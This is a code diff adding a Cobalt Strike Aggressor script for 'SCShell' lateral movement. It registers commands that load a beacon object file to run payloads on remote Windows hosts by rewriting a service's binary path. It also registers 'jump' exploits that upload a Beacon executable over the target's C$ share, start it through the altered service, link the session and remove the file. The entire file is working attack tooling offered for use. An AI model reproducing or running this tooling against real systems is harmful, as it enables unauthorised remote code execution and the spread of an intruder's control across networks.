@@ -1,0 +1,102 @@
+global("%scshell_settings");
+
+sub bscshell {
+    local('$barch $bofname $handle $data $args');
+    $barch = barch($1);
+
+    $bofname = "scshellbof.";
+    if ($5 eq "imp")
+    {
+	$bofname = "$bofname $+ imp.";
+    }
+    $bofname = "$bofname $+ $barch $+ .o";
+
+    $handle = openf(script_resource($bofname));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    $args   = bof_pack($1, "zzz", $2, $3, $4);
+    btask($1, "Running BOF SCShell ( $+ $bofname $+ )");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias scshell {
+    if (size(@_) < 4)
+    {
+        berror($1, "Invalid number of arguments! (See 'help scshell')");
+	return 1;
+    }
+    bscshell($1, $2, $3, $4, $5);
+}
+
+beacon_command_register(
+    "scshell",
+    "lateral movement using ChangeServiceConfigA API",
+    "Use: scshell [target] [service] [payload] [imp]\n" .
+    "     scshell [target] [service] [payload]\n\n" .
+    "Executes command `payload` on `target` by modifying the service binary path for `service` using the ChangeServiceConfigA API call\n" .
+    "Also attempts to restore the original binary path of the service after executing the payload.\n" .
+    "Optionally impersonates the current process token (imp) or uses the logon session (attached to the process token) for authentication."
+);
+
+sub scshell_remote_spawn {
+    local('$name $exedata $service');
+    btask($1, "Tasked beacon to jump to $2 (" . listener_describe($3) . ") via SCShell", "T1569");
+    $exepath = %scshell_settings["exepath"];
+    $exedata = artifact_payload($3, "svcexe", $arch);
+    bupload_raw($1, "\\\\ $+ $2 $+ \\C\$\\ $+ $exepath", $exedata);
+    fork(&scshell_remote_spawn2, $bid => $1, $target => $2, $listener => $3, $exepath => $exepath, $delay => %scshell_settings["delay"], $service => %scshell_settings["service"]);
+}
+
+sub scshell_remote_spawn2 {
+    if ($delay > 0) {
+        blog2($bid, "Waiting for $+  $delay  $+ seconds...");
+	blog2($bid, "Now it is " . dstamp(ticks()) . ", going to detonate at " . dstamp(ticks() + ($delay * 1000)));
+	sleep($delay * 1000);
+	blog2($bid, "Detonating Jump SCShell!");
+    }
+    bscshell($bid, $target, $service, "C:\\ $+ $exepath");
+    beacon_link($bid, $target, $listener);
+    brm($bid, "\\\\ $+ $target $+ \\C\$\\ $+ $exepath");
+}
+
+beacon_remote_exploit_register("scshell", "x86", "Use ChangeServiceConfigA to run Beacon payload", lambda(&scshell_remote_spawn, $arch => "x86"));
+beacon_remote_exploit_register("scshell64", "x64", "Use ChangeServiceConfigA to run Beacon payload", lambda(&scshell_remote_spawn, $arch => "x64"));
+
+# add some defaults
+%scshell_settings["service"] = "defragsvc";
+%scshell_settings["exepath"] = "Windows\\System32\\" . rand(@("malware", "evil", "detectme")) . rand(100) . ".exe";
+%scshell_settings["delay"] = 0;
+    
+alias scshell-settings {
+    if ($2 eq "service") {
+        %scshell_settings["service"] = $3;
+	blog2($1, "Service to change binary path for the `jump scshell[64]` cmds is set to ` $+ $3 $+ `");
+    }
+    else if ($2 eq "exepath") {
+        %scshell_settings["exepath"] = $3;
+	blog2($1, "Exe path for the `jump scshell[64]` cmds is set to ` $+ $3 $+ `");
+    }
+    else if ($2 eq "delay") {
+        %scshell_settings["delay"] = $3;
+	blog2($1, "Delay between file copy and cmd exec for the `jump scshell[64]` cmds is set to ` $+ $3 $+ ` seconds.");
+    }
+    else {
+        blog2($1, "Settings for the `jump scshell[64]` cmds:");
+	blog2($1, "  service = " . %scshell_settings["service"]);
+        blog2($1, "  exepath = " . %scshell_settings["exepath"]);
+        blog2($1, "  delay   = " . %scshell_settings["delay"]);
+    }
+}
+
+beacon_command_register(
+    "scshell-settings",
+    "set options for scshell based jump commands",
+    "Use: scshell-settings [setting] [value]\n\n" .
+    "Set settings to be used for the `jump scshell[64]` cmds.\n\n" .
+    "Supported settings:\n" .
+    "  service - Set the service to be changed\n" .
+    "  exepath - Remote exe path for uploaded artifact\n" .
+    "  delay - Add an optional delay (in seconds) between remote file copy and cmd execution (via starting the temporarily changed service)\n\n" .
+    "Without any options the command simply displays the current settings.\n"
+);
